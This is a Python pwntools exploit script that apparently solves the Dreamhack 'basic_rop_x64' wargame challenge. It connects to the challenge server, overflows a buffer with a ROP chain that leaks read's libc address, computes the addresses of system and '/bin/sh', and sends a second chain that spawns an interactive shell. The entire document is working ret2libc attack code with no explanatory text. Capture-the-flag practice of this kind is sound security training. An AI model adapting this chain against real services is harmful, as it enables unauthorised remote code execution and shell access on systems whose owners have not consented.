from pwn import *

port = 10865
rem = remote("host1.dreamhack.games", port)
elf = ELF("./basic_rop_x64/problem/basic_rop_x64")
lib = ELF("./basic_rop_x64/problem/libc.so.6")

def slog(name, addr): return success(': '.join([name, hex(addr)]))

# get gadget
read_plt = elf.plt['read']
read_got = elf.got['read']
write_plt = elf.plt['write']
main = elf.symbols['main']
ret = 0x4005a9
pop_rdi = 0x400883
pop_rsi = 0x400881

# make payload
payload = b'A' * 0x48

payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rsi)
payload += p64(read_got)
payload += p64(0)
payload += p64(write_plt)

payload += p64(main)

rem.send(payload)

# get system address
rem.recvuntil(b'A' * 0x40)
read_addr = u64(rem.recvn(6) + b'\x00' * 0x2)
read_offset = lib.symbols['read']
lib_base = read_addr - read_offset
sys_offset = lib.symbols['system']
sys_addr = lib_base + sys_offset
binsh_offset = list(lib.search('/bin/sh'))[0]
binsh_addr = lib_base + binsh_offset

slog('read', read_addr)
slog('libc_base', lib_base)
slog('system', sys_addr)

# make payload
payload = b'A' * 0x48

payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(sys_addr)
rem.send(payload)

rem.recvuntil(b'A' * 0x40)

rem.interactive()